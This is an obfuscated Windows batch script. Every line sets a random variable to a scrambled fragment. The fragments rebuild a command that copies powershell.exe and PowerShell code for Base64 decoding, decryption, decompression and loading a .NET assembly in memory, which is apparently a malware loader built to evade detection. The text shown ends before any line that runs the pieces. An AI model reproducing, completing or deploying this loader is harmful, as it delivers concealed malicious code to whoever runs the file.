@echo off
set "nREKTdjIvx=0\"
set "PmaFzUAhvI=ow"
set "yTgixUZIRf=\v"
set "ogUlbjvIEY=ll"
set "agJtEDLseG= C"
set "JshdNqzfUz=rS"
set "mhLFwfRyFH=Po"
set "sQMkCDzCKh=ws"
set "HawaxGwHXa=st"
set "HqqsbUdtUl=po"
set "yXembOgnmf=\W"
set "FMDfTsAOxm=1."
set "lHRquFnfLL=y "
set "AEPLVsvXKD=em"
set "rhVIUnoFVN=32"
set "OCoJMDTmyD=s\"
set "TwnxVaLkuK=Wi"
set "BcgCvaeGvB=we"
set "rySyQzeOfj=do"
set "EGfAATScxQ=xe"
set "XBrNKjlcVG=py"
set "VKHxhkutlN=nd"
set "wdbjsbuINm=:\"
set "qeNPqBFfmW=co"
set "SBYuKMvDci=Sy"
set "zSYGaJaAAe= /"
set "HGiyHqJjOC=ll"
set "hlpxcnMmzs=in"
set "PUMCoGpwou=rs"
set "LqmtypvkeZ=he"
set "afdgHMEOeu=.e"
set "kevWfVddFp=we"
set "NjCrfjMnbL=he"
set "oVmrzKYSwP= %~dp0"
set "dyHHuSkNph=cd"
set "jKrdWlWNKP=$rJh"
set "iwLZsSMVhE=eN.T"
set "oWSAuEEHFE=16] "
set "XxVtckdnQI=PTtG"
set "TDlOfpewAj=y]::"
set "tVgkEDtLgI=tS.D"
set "AwTUhWvlSm===')"
set "upQFXqfUQo=.Dis"
set "dzGUwgCjER=::('"
set "MSZVtgsNQt=bjec"
set "shngNHYEyZ=ring"
set "vFwMxNPXTq='txe"
set "LSGXIBcdDy=-1.."
set "xqGImLjKTO=gjYA"
set "oWluFpXxpM=);$C"
set "gqPPPHBTdi=rity"
set "DWEtmPMxaR=pStr"
set "ihcningZLR=e = "
set "ptrzQpnvrJ=Secu"
set "oJEdHZIUTK=)($r"
set "WrxEjqYAtc== $C"
set "RdmrdphYfG=ress"
set "ViqKwGysvA=f = "
set "QVZLdHSosh=m.Re"
set "VtYCaSSyJK=();$"
set "QnGyyddLEx=$CFd"
set "IARywQUQSO=ecry"
set "rNDqRqaBSJ=Fdmg"
set "rPUnnTHbBk=eam("
set "yHlgGJJYjh=Obje"
set "XxdPLRyEbv= [st"
set "OcNeWjhedC=O.Me"
set "gwbhYrgqZd=esMa"
set "lrWYAXNMQH=trea"
set "pFdqoQNOLE=CztS"
set "EnJXDiLlcE=orF'"
set "ecVdgSxRHB=yTo("
set "ryFlPxaIwm=ion."
set "aZBWcwnDke=RmAx"
set "vqvTKOWqVy='[-1"
set "vDbLFIwAqU=();$"
set "MfaarCsAty=[Sys"
set "WOsLOuVwWH=gMod"
set "ZNjLpoOlAG=se()"
set "fSgPcqMiCL=('da"
set "HxfwMNVrsM=tem."
set "CsmBMiSJIW=eN);"
set "UlPwHqvYSi=.-16"
set "kMtGGagAOr=nage"
set "UKigaUdPSS=Q.Su"
set "uVHJemNXgW=-Obj"
set "KzmUwtNpHZ= = N"
set "gDQbcxvRnz=CFdm"
set "CsgluiIpTy=Conv"
set "aZcaAFjUAJ= New"
set "UhVGCMrMEm=onve"
set "PcfPIiWNVu=ne);"
set "surJOVspLE=pres"
set "vQDxMudgdi=[IO."
set "yGNOzwqZQi=-nop"
set "bmipgLfhnk=($DG"
set "enRJOhxwZT=.Ass"
set "JsnvpoYPFT=l5E7"
set "QYEmrWBWPr=em.I"
set "ZYLZlBEfSh=ing("
set "OZwjRFGlyR=rofi"
set "dozoQOszgj=dj0C"
set "ZKNiamUHtI=[]] "
set "cMpKgtxmpn='')("
set "xhukNVaVGj=comp"
set "iOGOEuudai=MDeh"
set "RzlRdZEYUf=.IO."
set "LYUaAcEnDb=]::("
set "oRfhYtkDvs=YN.T"
set "hAKLABwKrl=Mode"
set "jBdVgaNDQq=ss -"
set "lsWTYzCNhY=rtS4"
set "ZbRapSEkqa=daeR"
